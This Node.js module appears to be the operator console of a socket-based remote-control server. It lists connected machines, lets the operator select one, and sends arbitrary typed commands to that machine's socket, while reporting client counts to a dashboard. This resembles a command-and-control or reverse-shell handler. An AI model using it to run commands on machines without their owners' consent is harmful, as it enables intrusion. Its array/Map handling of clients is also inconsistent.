"use strict";
const dashboard = require("./web_server/ws_server.js");
const socketClients = require("./socket_server/clients.js");
const state = require("./socket_server/state.js");
const readline = require("readline");
const rl = readline.createInterface({
    input  : process.stdin,
    output : process.stdout,
});

const manageServer = {
    getClientData : (client) => {
        try {
            for (let i = 0; i < socketClients.length; i++) {
                if (socketClients[i].address === client.remoteAddress + ":" + client.remotePort) {
                    return socketClients[i];
                }
            }
        } catch {
            console.error("Could not find client.");
            return;
        }
    },
    
    getAndSendNumberOfClients : (server) => {
        server.getConnections((err, count) => {
            if(err) return err;
            else {
                dashboard.uploadClientCount(count);
            }
        });
    },

    gotoMainMenu : () => {
        const clientsMap = manageServer.getAndListConnectedClients();
        rl.question("$ ", (cmd) => {
            let client;
            try {
                const clientIp = clientsMap.get(parseInt(cmd));
                client = socketClients.get(clientIp);
                if (!client.name) throw new Error;
            } catch {
                console.error("Unable to switch to client:",cmd);
                manageServer.gotoMainMenu();

                return;
            }
            state.setCurrentConnection(client);
            manageServer.getAndSendSocketCommand(client);
        });
    },

    getAndSendSocketCommand : async (client) => {
        const clientSocket = client.client;
        rl.question(`${client.name} # `, (cmd) => {
            if (cmd === "menu" || cmd === "exit") {
                manageServer.gotoMainMenu();
            } else {
                clientSocket.write(cmd);
            }
        });    
    },

    getAndListConnectedClients : () => {
        console.log("Connected machines:");
        const clientsMap = new Map();
        let index = 0;
        for (const key of socketClients.keys()) {
            console.log(`${index}) ${key}`);
            clientsMap.set(index, key)

            index++;
        }
        return clientsMap;
    },
};

module.exports = manageServer;